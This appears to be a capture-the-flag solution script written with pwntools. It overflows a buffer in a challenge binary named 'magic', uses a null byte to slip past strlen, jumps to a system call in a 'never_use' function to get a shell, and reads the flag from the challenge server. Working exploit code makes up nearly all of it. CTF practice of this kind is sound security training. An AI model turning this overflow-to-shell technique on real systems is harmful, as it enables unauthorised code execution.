#!/bin/usr/python3
from pwn import *

elf = context.binary = ELF("./magic")

never_use = elf.symbols.never_use

# NX is enable, no shellcode is allowed
# however, we can found that canary is off
# there is a system call in never_use function. it's a very good backdoor
# we just need to jump to that systemcall and get the shell
# scanf and strlen cut the string by \x00
# so i sent an a and cut it by \x00
# i use gdb to find that the pattern is 70 before the magic function return 
payload = b"a" + b"\x00" + b"c" * 70 + p32(never_use + 6)
#f = open("./payload", "wb")
#f.write(payload)
#f.close()

#p = process("./magic")
p = remote("bamboofox.cs.nctu.edu.tw", 10000)
p.sendlineafter("Give me your name(a-z):", "a")
p.sendlineafter("Give me something that you want to MAGIC:", payload)
# i dont know why if i dont send cat by pwntools, the remote shell wont respond
p.sendline("cat /home/ctf/flag")
info("sent complete")
p.interactive()

